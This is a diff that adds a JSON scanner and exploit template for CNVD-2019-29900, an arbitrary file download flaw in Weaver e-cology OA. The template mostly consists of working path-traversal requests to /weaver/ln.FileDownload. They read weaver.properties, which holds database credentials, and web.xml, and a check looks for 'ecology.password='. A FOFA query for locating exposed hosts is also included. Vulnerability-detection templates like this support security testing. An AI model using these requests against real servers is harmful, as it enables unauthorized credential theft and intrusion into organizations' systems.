@@ -1,0 +1,78 @@
+{
+  "Name": "Weaver e-cology OA file download (CNVD-2019-29900)",
+  "Description": "Weaver e-cology OA has an arbitrary file download vulnerability, which can be exploited by attackers to obtain sensitive information.",
+  "Product": "Weaver-OA",
+  "Homepage": "http://www.weaver.com.cn/",
+  "DisclosureDate": "2019-09-18",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Weaver-OA\"",
+  "Level": "2",
+  "Impact": "Attackers can use this vulnerability to obtain sensitive information.",
+  "Recommendation": "The manufacturer has provided a repair plan, and it is recommended to download the update.",
+  "References": [
+    "https://www.cnvd.org.cn/flaw/show/CNVD-2019-29900"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "file",
+      "type": "createSelect",
+      "value": "/WEB-INF/prop/weaver.properties,/WEB-INF/web.xml",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "uri": "/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "ecology.password=",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "uri": "/weaver/ln.FileDownload?fpath=../ecology{{{file}}}"
+      },
+      "SetVariable": [
+        "output|lastbody"
+      ]
+    }
+  ],
+  "Tags": ["filedownload"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Weaver-OA"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
